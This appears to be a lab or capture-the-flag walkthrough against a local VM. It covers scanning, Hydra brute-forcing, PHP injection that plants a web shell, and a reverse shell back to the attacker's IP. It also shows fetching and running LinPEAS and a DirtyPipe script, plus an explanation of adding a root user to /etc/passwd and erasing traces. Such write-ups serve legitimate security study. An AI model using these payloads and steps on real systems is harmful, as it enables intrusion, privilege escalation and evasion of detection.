1. Detect which devices are online on the same network segment
     ```
     sudo netdiscover -i eth0
     ```
     ![image](https://hackmd.io/_uploads/H1Vsfq48le.png)
2. Scan the IP
    ```
    nmap 192.168.101.129 -sV
    ```
    ![image](https://hackmd.io/_uploads/HJAJ79NIxl.png)
3. check the web page
    ```
    curl -i http://192.168.101.129
    ```
    ![image](https://hackmd.io/_uploads/HkRQQqEIge.png)
4. use nikto to scan Apache service(port 80)
    ```
    nikto -h http://192.168.101.129
    ```
    ![image](https://hackmd.io/_uploads/ryy5X54Ilx.png)
5. Enumerate directories and files
    ```
    gobuster dir -u http://192.168.101.129 -w /usr/share/wordlists/dirb/common.txt
    ```
    * However, `robots.txt` and the `jquery` directory also had nothing useful
6. Use Hydra to brute-force the target's HTTP GET requests
    ```
    hydra -l admin -P /usr/share/wordlists/rockyou.txt http-get://192.168.101.129:80 -V
    ```
    ![image](https://hackmd.io/_uploads/Hyog9qELxx.png)
    * `http-get` means the target is an HTTP service based on `GET` requests
    * `-l admin` specifies the username as `admin`
    * `-P` specifies the use of `rockyou.txt` as the password dictionary
    * `-V` displays detailed attempt output
    * In the end, no valid login page was found
7. Brute-force directories. `-x php,html,txt` specifies the file extensions to try
    ```
    gobuster dir -u http://192.168.101.129:80 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php , html , txt
    ```
    ![image](https://hackmd.io/_uploads/HyR_h24Lgg.png)
8.  view `graffiti.txt`
![image](https://hackmd.io/_uploads/BJ_jTnNLeg.png)
    * Found that the text entered in the input box is displayed in the graffiti.txt above
9.  Burp intercepts and modifies the request before sending
![image](https://hackmd.io/_uploads/rJ_mHa4Llg.png)
    * Use `<?php phpinfo(); ?>` first to test whether injection succeeds
    * Since spaces may cause the PHP code to be filtered or parsed incorrectly, use:
      `message=%3C%3Fphp%20phpinfo()%3B%20%3F%3E&file=shell.php`
10. successfully ran the phpinfo page![image](https://hackmd.io/_uploads/SkDXITNIee.png)
11. Start planting a reverse shell
![image](https://hackmd.io/_uploads/H1Fj6648ex.png)
![image](https://hackmd.io/_uploads/Byg10aNIel.png)
    - Use the command `<?php system($_GET['cmd']); ?>`
12. Issue commands so I can listen on the attacking machine
    ```
    http://192.168.101.129/shell6.php?cmd=echo%20cHl0aG9uMyAtYyAnaW1wb3J0IG9zLHB0eSxzb2NrZXQ7cz1zb2NrZXQuc29ja2V0KCk7cy5jb25uZWN0KCgiMTkyLjE2OC4xMDEuMTI4Iiw0NDQ0KSk7W29zLmR1cDIocy5maWxlbm8oKSxmKWZvciB[...]
    ```
    The decoded command result is:
    ```python
    python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("192.168.101.128",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'
    ```
    * 192.168.101.128 is the attacker’s own IP

    Successful listening:
    ![image](https://hackmd.io/_uploads/rk6UE0VIlx.png)
13. Get an interactive shell
    ```
    python3 -c 'import pty; pty.spawn("/bin/bash")'
    export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp
    export TERM=xterm-256color
    alias ll='ls -lsaht --color=auto'
    Ctrl + Z [Background Process]
    stty raw -echo ; fg ; reset
    stty columns 200 rows 200
    ```
    ![image](https://hackmd.io/_uploads/HJKssxB8gg.png)
14. Upload the attacker's `linpeas.sh` to the victim to scan for vulnerabilities
![image](https://hackmd.io/_uploads/rkqDy1SIee.png)
    ```
    # On the attacker side (listener)
    python -m http.server

    # On the victim side, download
    wget 192.168.101.128:8000/Desktop/linpeas.sh -O /tmp/linpeas.sh

    # Make it executable
    chmod +x linpeas.sh.1

    # Run
    ./linpeas.sh.1
    ```
15. Use the vulnerability found by LinPEAS to escalate privileges
    * Potential vulnerabilities:
      `CVE-2021-3490` (eBPF ALU32 bounds tracking): may be exploitable for privilege escalation.
      `CVE-2022-0847` (DirtyPipe): a very powerful vulnerability that can directly escalate privileges.
      `CVE-2021-3156` (sudo Baron Samedit): if the sudo version matches, this vulnerability may be exploitable.

    ![image](https://hackmd.io/_uploads/BkL2A1SUxe.png)

    Download the DirtyPipe script on the attacker side and upload it to the victim to execute
    ![image](https://hackmd.io/_uploads/S1kOleBIel.png)
    ```
    # Download from the attacker side
    wget 192.168.101.128:8000/Desktop/CVE/Dirty-Pipe.sh -O /tmp/DirtyPipe

    # Make executable
    chmod +x Dirty-Pipe.sh

    # Run
    bash Dirty-Pipe.sh

    # Verify identity
    whoami
    ```
16. read the flag
![image](https://hackmd.io/_uploads/HJJrGeBUgl.png)

---

### DirtyPipe Privilege Escalation Logic
1. Vulnerability background:
   - The DirtyPipe vulnerability exists in the Linux kernel pipe implementation and affects versions 5.8 and above.
   - It allows an attacker to write arbitrary data into a file through a pipe, even if the file is read-only.

2. Steps of exploitation:
   - Create a pipe:
     The attacker creates a pipe and writes data into it.
   - Locate the target file:
     Use a file descriptor to open the target file (for example, `/etc/passwd`).
   - Overwrite the file content:
     Use the DirtyPipe vulnerability to inject malicious data into a specific location in the target file.

3. Privilege escalation implementation:
   - Modify the `/etc/passwd` file and add a user with `root` privileges.
     Example:
     ```
     rootkit:x:0:0:root:/root:/bin/bash
     ```
   - Log in with the newly added user to gain `root` privileges.

4. Restore the file:
   - To avoid crashing the system or being detected, attackers usually back up the original file and restore it after privilege escalation.

---

### Core Logic of the DirtyPipe Privilege Escalation Script
1. Back up the `/etc/passwd` file:
   - Prevent modifications from rendering the system unusable.
2. Exploit the vulnerability to write malicious data:
   - Inject the malicious user information into the `/etc/passwd` file.
3. Switch to the new user:
   - Log in with the new user to gain `root` privileges.
4. Clean up traces:
   - Restore `/etc/passwd`, delete the script, and remove temporary files.

---

### Impact of DirtyPipe
- Unprivileged users can directly gain `root` privileges.
- Attackers can modify any file, including system configuration files.
- Affects all Linux systems running kernel versions impacted by the vulnerability.
